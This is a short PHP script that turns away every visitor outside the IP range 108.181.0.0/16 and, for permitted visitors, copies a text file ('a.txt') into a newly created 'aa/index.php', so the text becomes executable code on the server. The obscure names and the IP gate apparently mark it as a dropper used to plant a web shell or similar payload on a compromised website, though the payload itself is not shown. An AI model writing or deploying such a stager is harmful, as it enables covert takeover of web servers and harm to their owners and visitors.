<?php
$allowedIPRange = '108.181.0.0/16';
$clientIP = $_SERVER['REMOTE_ADDR'];

// Function to check if an IP address is within a given IP range
function ipInRange($ip, $range)
{
    if (strpos($range, '/') === false) {
        $range .= '/32';
    }

    list($subnet, $bits) = explode('/', $range);
    $ip = ip2long($ip);
    $subnet = ip2long($subnet);
    $mask = -1 << (32 - $bits);
    $subnet &= $mask;

    return ($ip & $mask) == $subnet;
}

// Check if the client IP is within the allowed IP range
if (!ipInRange($clientIP, $allowedIPRange)) {
    header('HTTP/1.1 403 Forbidden');
    echo '403 Forbidden';
    exit;
}

// Create the directory if it doesn't exist
$directory = 'aa';
if (!is_dir($directory)) {
    mkdir($directory);
}

// Copy the file
$sourceFile = 'a.txt';
$destinationFile = $directory . '/index.php';

if (copy($sourceFile, $destinationFile)) {
    echo 'File copied successfully!';
} else {
    echo 'Failed to copy the file.';
}
?>
